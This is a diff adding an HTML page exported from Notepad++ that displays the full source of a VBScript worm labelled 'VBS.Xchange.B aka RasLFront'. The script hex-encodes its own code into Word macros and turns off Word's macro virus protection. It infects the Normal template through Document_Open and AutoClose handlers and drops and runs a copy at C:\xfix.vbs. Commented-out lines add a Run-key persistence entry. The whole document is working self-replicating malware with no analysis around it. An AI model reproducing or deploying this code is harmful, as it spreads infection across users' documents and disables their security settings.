@@ -1,0 +1,122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'VBS.Xchange.B aka RasLFront
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fl</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullname</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">virus</span><span class="sc6">=</span><span class="sc7">fl.ReadAll</span><span class="sc0">
+</span><span class="sc7">fl.Close</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc6">=</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">fcopy</span><span class="sc6">=</span><span class="sc7">win&amp;</span><span class="sc4">"\XchgFix.vbs"</span><span class="sc0">
+</span><span class="sc7">reg</span><span class="sc6">=</span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc0">
+</span><span class="sc1">'fso.GetFile(WScript.ScriptFullName).Copy(fcopy)
+'ws.RegWrite reg&amp;"\MsExchangeFix",fcopy
+</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">sp</span><span class="sc6">=</span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc4">"C:\rlf.sys"</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">,</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Private Sub Document_Open()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"e = """""</span><span class="sc0">
+
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">len</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc7">e</span><span class="sc6">=</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">,</span><span class="sc7">i</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc6">=</span><span class="sc7">Hex</span><span class="sc6">(</span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc7">e</span><span class="sc6">))</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">e</span><span class="sc6">)=</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">e</span><span class="sc6">=</span><span class="sc4">"0"</span><span class="sc6">&amp;</span><span class="sc7">e</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">f</span><span class="sc6">+</span><span class="sc7">e</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">f</span><span class="sc6">)=</span><span class="sc2">110</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"e = e + """</span><span class="sc6">+</span><span class="sc7">f</span><span class="sc6">+</span><span class="sc4">""""</span><span class="sc0">
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">virus</span><span class="sc6">)-</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"e = e + """</span><span class="sc6">+</span><span class="sc7">f</span><span class="sc6">+</span><span class="sc4">""""</span><span class="sc0">
+</span><span class="sc7">f</span><span class="sc6">=</span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">Next</span><span class="sc0">
+
+
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Call infect_fichier"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub HelpAbout()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"MsgBox ""This is my very first VBS-W97M Worm"", vbInformation, ""I-Worm.Xchange"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub AutoClose()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"FileSystem.Kill ""C:\xfix.vbs"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Sub"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Sub infect_fichier()"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set nor = NormalTemplate.VBProject.VBComponents(1)"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Set doc = ActiveDocument.VBProject.VBComponents(1)"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"df = ""C:\rlf.sys"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"If nor.Name &lt;&gt; ""raslfront"" Then"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"nor.Name = ""raslfront"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"read=dec(e)"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Open ""C:\xfix.vbs"" For Output As #1"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Print #1, read"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Close #1"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Shell ""wscript C:\xfix.vbs"""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Function dec(octe)"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"For hexad = 1 To Len(octe) Step 2"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"dec = dec &amp; Chr(""&amp;h"" &amp; Mid(octe, hexad, 2))"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"Next"</span><span class="sc0">
+</span><span class="sc7">sp.WriteLine</span><span class="sc0"> </span><span class="sc4">"End Function"</span><span class="sc0">
+</span><span class="sc7">sp.Close</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wrd</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Word.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">wrd.Options.virusprotection</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc7">wrd.Options.savenormalprompt</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc7">wrd.Options.confirmconversion</span><span class="sc6">=</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">wrd.normaltemplate.vbproject.vbcomponents</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">).</span><span class="sc7">name</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"raslfront"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">wrd.normaltemplate.vbproject.vbcomponents</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">).</span><span class="sc7">codemodule.addfromFile</span><span class="sc6">(</span><span class="sc4">"C:\rlf.sys"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">wrd.normaltemplate.vbproject.vbcomponents</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">).</span><span class="sc7">name</span><span class="sc6">=</span><span class="sc4">"raslfront"</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Pas Encore"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc7">wrd.Application.Quit</span><span class="sc0">
+</span><span class="sc7">WScript.Quit</span></div></body>
+</html>
